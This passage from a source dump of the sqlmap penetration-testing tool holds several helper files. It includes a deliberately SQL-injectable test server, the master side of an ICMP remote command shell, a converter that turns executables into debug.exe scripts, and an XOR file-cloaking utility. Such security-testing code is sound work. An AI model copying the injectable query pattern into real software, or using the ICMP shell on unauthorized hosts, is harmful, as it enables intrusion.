'LICENSE' for copying permission\n\"\"\"\n\npass\n", "extra/vulnserver/vulnserver.py": "#!/usr/bin/env python\n\n\"\"\"\nvulnserver.py - Trivial SQLi vulnerable HTTP server (Note: for testing purposes)\n\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport base64\nimport json\nimport re\nimport sqlite3\nimport sys\nimport threading\nimport traceback\n\nPY3 = sys.version_info >= (3, 0)\nUNICODE_ENCODING = \"utf-8\"\nDEBUG = False\n\nif PY3:\n    from http.client import INTERNAL_SERVER_ERROR\n    from http.client import NOT_FOUND\n    from http.client import OK\n    from http.server import BaseHTTPRequestHandler\n    from http.server import HTTPServer\n    from socketserver import ThreadingMixIn\n    from urllib.parse import parse_qs\n    from urllib.parse import unquote_plus\nelse:\n    from BaseHTTPServer import BaseHTTPRequestHandler\n    from BaseHTTPServer import HTTPServer\n    from httplib import INTERNAL_SERVER_ERROR\n    from httplib import NOT_FOUND\n    from httplib import OK\n    from SocketServer import ThreadingMixIn\n    from urlparse import parse_qs\n    from urllib import unquote_plus\n\nSCHEMA = \"\"\"\n    CREATE TABLE users (\n        id INTEGER,\n        name TEXT,\n        surname TEXT,\n        PRIMARY KEY (id)\n    );\n    INSERT INTO users (id, name, surname) VALUES (1, 'luther', 'blisset');\n    INSERT INTO users (id, name, surname) VALUES (2, 'fluffy', 'bunny');\n    INSERT INTO users (id, name, surname) VALUES (3, 'wu', '179ad45c6ce2cb97cf1029e212046e81');\n    INSERT INTO users (id, name, surname) VALUES (4, 'sqlmap/1.0-dev (https://sqlmap.org)', 'user agent header');\n    INSERT INTO users (id, name, surname) VALUES (5, NULL, 'nameisnull');\n\"\"\"\n\nLISTEN_ADDRESS = \"localhost\"\nLISTEN_PORT = 8440\n\n_conn = None\n_cursor = None\n_lock = None\n_server = None\n_alive = False\n\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)\n    _cursor = _conn.cursor()\n    _lock = threading.Lock()\n\n    _cursor.executescript(SCHEMA)\n\n    if quiet:\n        global print\n\n        def _(*args, **kwargs):\n            pass\n\n        print = _\n\nclass ThreadingServer(ThreadingMixIn, HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\n\nclass ReqHandler(BaseHTTPRequestHandler):\n    def do_REQUEST(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")\n        params = {}\n\n        if query:\n            params.update(parse_qs(query))\n\n            if \"<script>\" in unquote_plus(query):\n                self.send_response(INTERNAL_SERVER_ERROR)\n                self.send_header(\"X-Powered-By\", \"Express\")\n                self.send_header(\"Connection\", \"close\")\n                self.end_headers()\n                self.wfile.write(\"CLOUDFLARE_ERROR_500S_BOX\".encode(UNICODE_ENCODING))\n                return\n\n        if hasattr(self, \"data\"):\n            if self.data.startswith('{') and self.data.endswith('}'):\n                params.update(json.loads(self.data))\n            elif self.data.startswith('<') and self.data.endswith('>'):\n                params.update(dict((_[0], _[1].replace(\"&apos;\", \"'\").replace(\"&quot;\", '\"').replace(\"&lt;\", '<').replace(\"&gt;\", '>').replace(\"&amp;\", '&')) for _ in re.findall(r'name=\"([^\"]+)\" value=\"([^\"]*)\"', self.data)))\n            else:\n                self.data = self.data.replace(';', '&')     # Note: seems that Python3 started ignoring parameter splitting with ';'\n                params.update(parse_qs(self.data))\n\n        for name in self.headers:\n            params[name.lower()] = self.headers[name]\n\n        if \"cookie\" in params:\n            for part in params[\"cookie\"].split(';'):\n                part = part.strip()\n                if '=' in part:\n                    name, value = part.split('=', 1)\n                    params[name.strip()] = unquote_plus(value.strip())\n\n        for key in params:\n            if params[key] and isinstance(params[key], (tuple, list)):\n                params[key] = params[key][-1]\n\n        self.url, self.params = path, params\n\n        if self.url == '/':\n            if not any(_ in self.params for _ in (\"id\", \"query\")):\n                self.send_response(OK)\n                self.send_header(\"Content-type\", \"text/html; charset=%s\" % UNICODE_ENCODING)\n                self.send_header(\"Connection\", \"close\")\n                self.end_headers()\n                self.wfile.write(b\"<!DOCTYPE html><html><head><title>vulnserver</title></head><body><h3>GET:</h3><a href='/?id=1'>link</a><hr><h3>POST:</h3><form method='post'>ID: <input type='text' name='id'><input type='submit' value='Submit'></form></body></html>\")\n            else:\n                code, output = OK, \"\"\n\n                try:\n                    if self.params.get(\"echo\", \"\"):\n                        output += \"%s<br>\" % self.params[\"echo\"]\n\n                    if self.params.get(\"reflect\", \"\"):\n                        output += \"%s<br>\" % self.params.get(\"id\")\n\n                    with _lock:\n                        if \"query\" in self.params:\n                            _cursor.execute(self.params[\"query\"])\n                        elif \"id\" in self.params:\n                            if \"base64\" in self.params:\n                                _cursor.execute(\"SELECT * FROM users WHERE id=%s LIMIT 0, 1\" % base64.b64decode(\"%s===\" % self.params[\"id\"], altchars=self.params.get(\"altchars\")).decode())\n                            else:\n                                _cursor.execute(\"SELECT * FROM users WHERE id=%s LIMIT 0, 1\" % self.params[\"id\"])\n                        results = _cursor.fetchall()\n\n                    output += \"<b>SQL results:</b><br>\\n\"\n\n                    if self.params.get(\"code\", \"\"):\n                        if not results:\n                            code = INTERNAL_SERVER_ERROR\n                    else:\n                        if results:\n                            output += \"<table border=\\\"1\\\">\\n\"\n\n                            for row in results:\n                                output += \"<tr>\"\n                                for value in row:\n                                    output += \"<td>%s</td>\" % value\n                                output += \"</tr>\\n\"\n\n                            output += \"</table>\\n\"\n                        else:\n                            output += \"no results found\"\n\n                    output += \"</body></html>\"\n                except Exception as ex:\n                    code = INTERNAL_SERVER_ERROR\n                    output = \"%s: %s\" % (re.search(r\"'([^']+)'\", str(type(ex))).group(1), ex)\n\n                self.send_response(code)\n\n                self.send_header(\"Content-type\", \"text/html\")\n                self.send_header(\"Connection\", \"close\")\n\n                if self.raw_requestline.startswith(b\"HEAD\"):\n                    self.send_header(\"Content-Length\", str(len(output)))\n                    self.end_headers()\n                else:\n                    self.end_headers()\n                    self.wfile.write(output if isinstance(output, bytes) else output.encode(UNICODE_ENCODING))\n        else:\n            self.send_response(NOT_FOUND)\n            self.send_header(\"Connection\", \"close\")\n            self.end_headers()\n\n    def do_GET(self):\n        self.do_REQUEST()\n\n    def do_PUT(self):\n        self.do_POST()\n\n    def do_HEAD(self):\n        self.do_REQUEST()\n\n    def do_POST(self):\n        length = int(self.headers.get(\"Content-length\", 0))\n        if length:\n            data = self.rfile.read(length)\n            data = unquote_plus(data.decode(UNICODE_ENCODING, \"ignore\"))\n            self.data = data\n        elif self.headers.get(\"Transfer-encoding\") == \"chunked\":\n            data, line = b\"\", b\"\"\n            count = 0\n\n            while True:\n                line += self.rfile.read(1)\n                if line.endswith(b'\\n'):\n                    if count % 2 == 1:\n                        current = line.rstrip(b\"\\r\\n\")\n                        if not current:\n                            break\n                        else:\n                            data += current\n\n                    count += 1\n                    line = b\"\"\n\n            self.data = data.decode(UNICODE_ENCODING, \"ignore\")\n\n        self.do_REQUEST()\n\n    def log_message(self, format, *args):\n        return\n\ndef run(address=LISTEN_ADDRESS, port=LISTEN_PORT):\n    global _alive\n    global _server\n    try:\n        _alive = True\n        _server = ThreadingServer((address, port), ReqHandler)\n        print(\"[i] running HTTP server at 'http://%s:%d'\" % (address, port))\n        _server.serve_forever()\n    except KeyboardInterrupt:\n        _server.socket.close()\n        raise\n    finally:\n        _alive = False\n\nif __name__ == \"__main__\":\n    try:\n        init()\n        run(sys.argv[1] if len(sys.argv) > 1 else LISTEN_ADDRESS, int(sys.argv[2] if len(sys.argv) > 2 else LISTEN_PORT))\n    except KeyboardInterrupt:\n        print(\"\\r[x] Ctrl-C received\")\n", "extra/vulnserver/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "extra/icmpsh/icmpsh_m.py": "#!/usr/bin/env python\n#\n#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in\n#  Perl by Nico Leidecker <nico@leidecker.info>)\n#\n#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>\n#\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport select\nimport socket\nimport sys\n\ndef setNonBlocking(fd):\n    \"\"\"\n    Make a file descriptor non-blocking\n    \"\"\"\n\n    import fcntl\n\n    flags = fcntl.fcntl(fd, fcntl.F_GETFL)\n    flags = flags | os.O_NONBLOCK\n    fcntl.fcntl(fd, fcntl.F_SETFL, flags)\n\ndef main(src, dst):\n    if sys.platform == \"nt\":\n        sys.stderr.write('icmpsh master can only run on Posix systems\\n')\n        sys.exit(255)\n\n    try:\n        from impacket import ImpactDecoder\n        from impacket import ImpactPacket\n    except ImportError:\n        sys.stderr.write('You need to install Python Impacket library first\\n')\n        sys.exit(255)\n\n    # Make standard input a non-blocking file\n    stdin_fd = sys.stdin.fileno()\n    setNonBlocking(stdin_fd)\n\n    # Open one socket for ICMP protocol\n    # A special option is set on the socket so that IP headers are included\n    # with the returned data\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    except socket.error:\n        sys.stderr.write('You need to run icmpsh master with administrator privileges\\n')\n        sys.exit(1)\n\n    sock.setblocking(0)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Create a new IP packet and set its source and destination addresses\n    ip = ImpactPacket.IP()\n    ip.set_ip_src(src)\n    ip.set_ip_dst(dst)\n\n    # Create a new ICMP packet of type ECHO REPLY\n    icmp = ImpactPacket.ICMP()\n    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)\n\n    # Instantiate an IP packets decoder\n    decoder = ImpactDecoder.IPDecoder()\n\n    while True:\n        try:\n            cmd = ''\n\n            # Wait for incoming replies\n            if sock in select.select([sock], [], [])[0]:\n                buff = sock.recv(4096)\n\n                if 0 == len(buff):\n                    # Socket remotely closed\n                    sock.close()\n                    sys.exit(0)\n\n                # Packet received; decode and display it\n                ippacket = decoder.decode(buff)\n                icmppacket = ippacket.child()\n\n                # If the packet matches, report it to the user\n                if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():\n                    # Get identifier and sequence number\n                    ident = icmppacket.get_icmp_id()\n                    seq_id = icmppacket.get_icmp_seq()\n                    data = icmppacket.get_data_as_string()\n\n                    if len(data) > 0:\n                        sys.stdout.write(data)\n\n                    # Parse command from standard input\n                    try:\n                        cmd = sys.stdin.readline()\n                    except:\n                        pass\n\n                    if cmd == 'exit\\n':\n                        return\n\n                    # Set sequence number and identifier\n                    icmp.set_icmp_id(ident)\n                    icmp.set_icmp_seq(seq_id)\n\n                    # Include the command as data inside the ICMP packet\n                    icmp.contains(ImpactPacket.Data(cmd))\n\n                    # Calculate its checksum\n                    icmp.set_icmp_cksum(0)\n                    icmp.auto_checksum = 1\n\n                    # Have the IP packet contain the ICMP packet (along with its payload)\n                    ip.contains(icmp)\n\n                    try:\n                        # Send it to the target host\n                        sock.sendto(ip.get_packet(), (dst, 0))\n                    except socket.error as ex:\n                        sys.stderr.write(\"'%s'\\n\" % ex)\n                        sys.stderr.flush()\n        except:\n            break\n\nif __name__ == '__main__':\n    if len(sys.argv) < 3:\n        msg = 'missing mandatory options. Execute as root:\\n'\n        msg += './icmpsh-m.py <source IP address> <destination IP address>\\n'\n        sys.stderr.write(msg)\n        sys.exit(1)\n\n    main(sys.argv[1], sys.argv[2])\n", "extra/icmpsh/__init__.py": "#!/usr/bin/env python\n#\n#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in\n#  Perl by Nico Leidecker <nico@leidecker.info>)\n#\n#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>\n#\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\npass\n", "extra/dbgtool/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "extra/dbgtool/dbgtool.py": "#!/usr/bin/env python\n\n\"\"\"\ndbgtool.py - Portable executable to ASCII debug script converter\n\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nimport sys\n\nfrom optparse import OptionError\nfrom optparse import OptionParser\n\ndef convert(inputFile):\n    fileStat = os.stat(inputFile)\n    fileSize = fileStat.st_size\n\n    if fileSize > 65280:\n        print(\"ERROR: the provided input file '%s' is too big for debug.exe\" % inputFile)\n        sys.exit(1)\n\n    script = \"n %s\\nr cx\\n\" % os.path.basename(inputFile.replace(\".\", \"_\"))\n    script += \"%x\\nf 0100 ffff 00\\n\" % fileSize\n    scrString = \"\"\n    counter = 256\n    counter2 = 0\n\n    fp = open(inputFile, \"rb\")\n    fileContent = fp.read()\n\n    for fileChar in fileContent:\n        unsignedFileChar = fileChar if sys.version_info >= (3, 0) else ord(fileChar)\n\n        if unsignedFileChar != 0:\n            counter2 += 1\n\n            if not scrString:\n                scrString = \"e %0x %02x\" % (counter, unsignedFileChar)\n            else:\n                scrString += \" %02x\" % unsignedFileChar\n        elif scrString:\n            script += \"%s\\n\" % scrString\n            scrString = \"\"\n            counter2 = 0\n\n        counter += 1\n\n        if counter2 == 20:\n            script += \"%s\\n\" % scrString\n            scrString = \"\"\n            counter2 = 0\n\n    script += \"w\\nq\\n\"\n\n    return script\n\ndef main(inputFile, outputFile):\n    if not os.path.isfile(inputFile):\n        print(\"ERROR: the provided input file '%s' is not a regular file\" % inputFile)\n        sys.exit(1)\n\n    script = convert(inputFile)\n\n    if outputFile:\n        fpOut = open(outputFile, \"w\")\n        sys.stdout = fpOut\n        sys.stdout.write(script)\n        sys.stdout.close()\n    else:\n        print(script)\n\nif __name__ == \"__main__\":\n    usage = \"%s -i <input file> [-o <output file>]\" % sys.argv[0]\n    parser = OptionParser(usage=usage, version=\"0.1\")\n\n    try:\n        parser.add_option(\"-i\", dest=\"inputFile\", help=\"Input binary file\")\n\n        parser.add_option(\"-o\", dest=\"outputFile\", help=\"Output debug.exe text file\")\n\n        (args, _) = parser.parse_args()\n\n        if not args.inputFile:\n            parser.error(\"Missing the input file, -h for help\")\n\n    except (OptionError, TypeError) as ex:\n        parser.error(ex)\n\n    inputFile = args.inputFile\n    outputFile = args.outputFile\n\n    main(inputFile, outputFile)\n", "extra/cloak/cloak.py": "#!/usr/bin/env python\n\n\"\"\"\ncloak.py - Simple file encryption/compression utility\n\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nimport struct\nimport sys\nimport zlib\n\nfrom optparse import OptionError\nfrom optparse import OptionParser\n\nif sys.version_info >= (3, 0):\n    xrange = range\n    ord = lambda _: _\n\nKEY = b\"E6wRbVhD0IBeCiGJ\"\n\ndef xor(message, key):\n    return b\"\".join(struct.pack('B', ord(message[i]) ^ ord(key[i % len(key)])) for i in range(len(message)))\n\ndef cloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n\n    return xor(zlib.compress(data), KEY)\n\ndef decloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    try:\n        data = zlib.decompress(xor(data, KEY))\n    except Exception as ex:\n        print(ex)\n        print('ERROR: the provided input file \\'%s\\' does not contain valid cloaked content' % inputFile)\n        sys.exit(1)\n    finally:\n        f.close()\n\n    return data\n\ndef main():\n    usage = '%s [-d] -i <input file> [-o <output file>]' % sys.argv[0]\n    parser = OptionParser(usage=usage, version='0.2')\n\n    try:\n        parser.add_option('-d', dest='decrypt', action=\"store_true\", help='Decrypt')\n        parser.add_option('-i', dest='inputFile', help='Input file')\n        parser.add_option('-o', dest='outputFile', help='Output file')\n\n        (args, _) = parser.parse_args()\n\n        if not args.inputFile:\n            parser.error('Missing the input file, -h for help')\n\n    except (OptionError, TypeError) as ex:\n        parser.error(ex)\n\n    if not os.path.isfile(args.inputFile):\n        print('ERROR: the provided input file \\'%s\\' is non existent' % args.inputFile)\n        sys.exit(1)\n\n    if not args.decrypt:\n        data = cloak(args.inputFile)\n    else:\n        data = decloak(args.inputFile)\n\n    if not args.outputFile:\n        if not args.decrypt:\n            args.outputFile = args.inputFile + '_'\n        else:\n            args.outputFile = args.inputFile[:-1]\n\n    f = open(args.outputFile, 'wb')\n    f.write(data)\n    f.close()\n\nif __name__ == '__main__':\n    main()\n", "extra/cloak/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "extra/shutils/newlines.py": "#! /usr/bin/env python\n\nfrom __future__ import print_function\n\nimport os\nimport sys\n\ndef check(filepath):\n    if filepath.endswith(\".py\"):\n        content = open(filepath, \"rb\").read()\n        pattern = \"\\n\\n\\n\".encode(\"ascii\")\n\n        if pattern in content:\n            index = content.find(pattern)\n            print(filepath, repr(content[index - 30:index + 30]))\n\nif __name__ == \"__main__\":\n    try:\n        BASE_DIRECTORY = sys.argv[1]\n    except IndexError:\n        print(\"no directory specified, defaulting to current working directory\")\n        BASE_DIRECTORY = os.getcwd()\n\n    print(\"looking for *.py scripts in subdirectories of '%s'\" % BASE_DIRECTORY)\n    for root, dirs, files in os.walk(BASE_DIRECTORY):\n        if any(_ in root for _ in (\"extra\", \"thirdparty\")):\n            continue\n        for name in files:\n            filepath = os.path.join(root, name)\n            check(filepath)\n", "extra/shutils/duplicates.py": "#!/usr/bin/env python\n\n# Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\n# See the file 'LICENSE' for copying permission\n\n# Removes duplicate entries in wordlist like files\n\nfrom __future__ import print_function\n\nimport sys\n\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        items = list()\n\n        with open(sys.argv[1], 'r') as f:\n            for item in f:\n                item = item.strip()\n                try:\n                    str.encode(item)\n                    if item in items:\n                        if item:\n                            print(item)\n                    else:\n                        items.append(item)\n                except:\n                    pass\n\n        with open(sys.argv[1], 'w+') as f:\n            f.writelines(\"\\n\".join(items))\n", "extra/beep/beep.py": "#!/usr/bin/env python\n\n\"\"\"\nbeep.py - Make a beep sound\n\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport sys\nimport wave\n\nBEEP_WAV_FILENAME = os.path.join(os.path.dirname(__file__), \"beep.wav\")\n\ndef beep():\n    try:\n        if sys.platform.startswith(\"win\"):\n            _win_wav_play(BEEP_WAV_FILENAME)\n        elif sys.platform.startswith(\"darwin\"):\n            _mac_beep()\n        elif sys.platform.startswith(\"cygwin\"):\n            _cygwin_beep(BEEP_WAV_FILENAME)\n        elif any(sys.platform.startswith(_) for _ in (\"linux\", \"freebsd\")):\n            _linux_wav_play(BEEP_WAV_FILENAME)\n        else:\n            _speaker_beep()\n    except:\n        _speaker_beep()\n\ndef _speaker_beep():\n    sys.stdout.write('\\a')  # doesn't work on modern Linux systems\n\n    try:\n        sys.stdout.flush()\n    except IOError:\n        pass\n\n# Reference: https://lists.gnu.org/archive/html/emacs-devel/2014-09/msg00815.html\ndef _cygwin_beep(filename):\n    os.system(\"play-sound-file '%s' 2>/dev/null\" % filename)\n\ndef _mac_beep():\n    import Carbon.Snd\n    Carbon.Snd.SysBeep(1)\n\ndef _win_wav_play(filename):\n    import winsound\n\n    winsound.PlaySound(filename, winsound.SND_FILENAME)\n\ndef _linux_wav_play(filename):\n    for _ in (\"aplay\", \"paplay\", \"play\"):\n        if not os.system(\"%s '%s' 2>/dev/null\" % (_, filename)):\n            return\n\n    import ctypes\n\n    PA_STREAM_PLAYBACK = 1\n    PA_SAMPLE_S16LE = 3\n    BUFFSIZE = 1024\n\n    class struct_pa_sample_spec(ctypes.Structure):\n        _fields_ = [(\"format\", ctypes.c_int), (\"rate\", ctypes.c_uint32), (\"channels\", ctypes.c_uint8)]\n\n    try:\n        pa = ctypes.cdll.LoadLibrary(\"libpulse-simple.so.0\")\n    except OSError:\n        return\n\n    wave_file = wave.open(filename, \"rb\")\n\n    pa_sample_spec = struct_pa_sample_spec()\n    pa_sample_spec.rate = wave_file.getframerate()\n    pa_sample_spec.channels = wave_file.getnchannels()\n    pa_sample_spec.format = PA_SAMPLE_S16LE\n\n    error = ctypes.c_int(0)\n\n    pa_stream = pa.pa_simple_new(None, filename, PA_STREAM_PLAYBACK, None, \"playback\", ctypes.byref(pa_sample_spec), None, None, ctypes.byref(error))\n    if not pa_stream:\n        raise Exception(\"Could not create pulse audio stream: %s\" % pa.strerror(ctypes.byref(error)))\n\n    while True:\n        latency = pa.pa_simple_get_latency(pa_stream, ctypes.byref(error))\n        if latency == -1:\n            raise Exception(\"Getting latency failed\")\n\n        buf = wave_file.readframes(BUFFSIZE)\n        if not buf:\n            break\n\n        if pa.pa_simple_write(pa_stream, buf, len(buf), ctypes.byref(error)):\n            raise Exception(\"Could not play file\")\n\n    wave_file.close()\n\n    if pa.pa_simple_drain(pa_stream, ctypes.byref(error)):\n        raise Exception(\"Could not simple drain\")\n\n    pa.pa_simple_free(pa_stream)\n\nif __name__ == \"__main__\":\n    beep()\n", "extra/beep/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "thirdparty/__init__.py": "", "thirdparty/termcolor/__init__.py": "", "thirdparty/termcolor/termcolor.py": "# coding: utf-8\n# Copyright (c) 2008-2011 Volvox Development Team\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n#\n# Author: Konstantin Lepa <konstantin.lepa@gmail.com>\n\n\"\"\"ANSII Color formatting for output in terminal.\"\"\"\n\nfrom __future__ import print_function\nimport os\n\n\n__ALL__ = [ 'colored', 'cprint' ]\n\nVERSION = (1, 1, 0)\n\nATTRIBUTES = dict(\n        list(zip([\n            'bold',\n            'dark',\n            '',\n            'underline',\n            'blink',\n            '',\n            'reverse',\n            'concealed'\n            ],\n            list(range(1, 9))\n            ))\n        )\ndel ATTRIBUTES['']\n\n\nHIGHLIGHTS = dict(\n        list(zip([\n            'on_grey',\n            'on_red',\n            'on_green',\n            'on_yellow',\n            'on_blue',\n            'on_magenta',\n            'on_cyan',\n            'on_white'\n            ],\n            list(range(40, 48))\n            ))\n        )\n\n\nCOLORS = dict(\n        list(zip([\n            'grey',\n            'red',\n            'green',\n            'yellow',\n            'blue',\n            'magenta',\n            'cyan',\n            'white',\n            ],\n            list(range(30, 38))\n            ))\n        )\n\nCOLORS.update(dict((\"light%s\" % color, COLORS[color] + 60) for color in COLORS))\n\n# Reference: https://misc.flogisoft.com/bash/tip_colors_and_formatting\nCOLORS[\"lightgrey\"] = 37\nCOLORS[\"darkgrey\"] = 90\n\nRESET = '\\033[0m'\n\n\ndef colored(text, color=None, on_color=None, attrs=None):\n    \"\"\"Colorize text.\n\n    Available text colors:\n        red, green, yellow, blue, magenta, cyan, white.\n\n    Available text highlights:\n        on_red, on_green, on_yellow, on_blue, on_magenta, on_cyan, on_white.\n\n    Available attributes:\n        bold, dark, underline, blink, reverse, concealed.\n\n    Example:\n        colored('Hello, World!', 'red', 'on_grey', ['blue', 'blink'])\n        colored('Hello, World!', 'green')\n    \"\"\"\n    if os.getenv('ANSI_COLORS_DISABLED') is None:\n        fmt_str = '\\033[%dm%s'\n        if color is not None:\n            text = fmt_str % (COLORS[color], text)\n\n        if on_color is not None:\n            text = fmt_str % (HIGHLIGHTS[on_color], text)\n\n        if attrs is not None:\n            for attr in attrs:\n                text = fmt_str % (ATTRIBUTES[attr], text)\n\n        text += RESET\n    return text\n\n\ndef cprint(text, color=None, on_color=None, attrs=None, **kwargs):\n    \"\"\"Print colorize text.\n\n    It accepts arguments of print function.\n    \"\"\"\n\n    print((colored(text, color, on_color, attrs)), **kwargs)\n\n\nif __name__ == '__main__':\n    print('Current terminal type: %s' % os.getenv('TERM'))\n    print('Test basic colors:')\n    cprint('Grey color', 'grey')\n    cprint('Red color', 'red')\n    cprint('Green color', 'green')\n    cprint('Yellow color', 'yellow')\n    cprint('Blue color', 'blue')\n    cprint('Magenta color', 'magenta')\n    cprint('Cyan color', 'cyan')\n    cprint('White color', 'white')\n    print(('-' * 78))\n\n    print('Test highlights:')\n    cprint('On grey color', on_color='on_grey')\n    cprint('On red color', on_color='on_red')\n    cprint('On green color', on_color='on_green')\n    cprint('On yellow color', on_color='on_yellow')\n    cprint('On blue color', on_color='on_blue')\n    cprint('On magenta color', on_color='on_magenta')\n    cprint('On cyan color', on_color='on_cyan')\n    cprint('On white color', color='grey', on_color='on_white')\n    print('-' * 78)\n\n    print('Test attributes:')\n    cprint('Bold grey color', 'grey', attrs=['bold'])\n    cprint('Dark red color', 'red', attrs=['dark'])\n    cprint('Underline green color', 'green', attrs=['underline'])\n    cprint('Blink yellow color', 'yellow', attrs=['blink'])\n    cprint('Reversed blue color', 'blue', attrs=['reverse'])\n    cprint('Concealed Magenta color', 'magenta', attrs=['concealed'])\n    cprint('Bold underline reverse cyan color', 'cyan',\n            attrs=['bold', 'underline', 'reverse'])\n    cprint('Dark blink concealed white color', 'white',\n            attrs=['dark', 'blink', 'concealed'])\n    print(('-' * 78))\n\n    print('Test mixing:')\n    cprint('Underline red on grey color', 'red', 'on_grey',\n            ['underline'])\n    cprint('Reversed green on red color', 'green', 'on_red', ['reverse'])\n\n", "thirdparty/ansistrm/ansistrm.py": "#\n# Copyright (C) 2010-2012 Vinay Sajip. All rights reserved. Licensed under the new BSD license.\n# (Note: 2018 modifications by @stamparm)\n#\n\nimport logging\nimport re\nimport sys\n\nfrom lib.core.settings import IS_WIN\n\nif IS_WIN:\n    import ctypes\n    import ctypes.wintypes\n\n    # Reference: https://gist.github.com/vsajip/758430\n    #            https://github.com/ipython/ipython/issues/4252\n    #            https://msdn.microsoft.com/en-us/library/windows/desktop/ms686047%28v=vs.85%29.aspx\n    ctypes.windll.kernel32.SetConsoleTextAttribute.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.WORD]\n    ctypes.windll.kernel32.SetConsoleTextAttribute.restype = ctypes.wintypes.BOOL\n\ndef stdoutEncode(data):  # Cross-referenced function\n    return data\n\nclass ColorizingStreamHandler(logging.StreamHandler):\n    # color names to indices\n    color_map = {\n        'black': 0,\n        'red': 1,\n        'green': 2,\n        'yellow': 3,\n        'blue': 4,\n        'magenta': 5,\n        'cyan': 6,\n        'white': 7,\n    }\n\n    # levels to (background, foreground, bold/intense)\n    level_map = {\n        logging.DEBUG: (None, 'blue', False),\n        logging.INFO: (None, 'green', False),\n        logging.WARNING: (None, 'yellow', False),\n        logging.ERROR: (None, 'red', False),\n        logging.CRITICAL: ('red', 'white', False)\n    }\n    csi = '\\x1b['\n    reset = '\\x1b[0m'\n    bold = \"\\x1b[1m\"\n    disable_coloring = False\n\n    @property\n    def is_tty(self):\n        isatty = getattr(self.stream, 'isatty', None)\n        return isatty and isatty() and not self.disable_coloring\n\n    def emit(self, record):\n        try:\n            message = stdoutEncode(self.format(record))\n            stream = self.stream\n\n            if not self.is_tty:\n                if message and message[0] == \"\\r\":\n                    message = message[1:]\n                stream.write(message)\n            else:\n                self.output_colorized(message)\n            stream.write(getattr(self, 'terminator', '\\n'))\n\n            self.flush()\n        except (KeyboardInterrupt, SystemExit):\n            raise\n        except IOError:\n            pass\n        except:\n        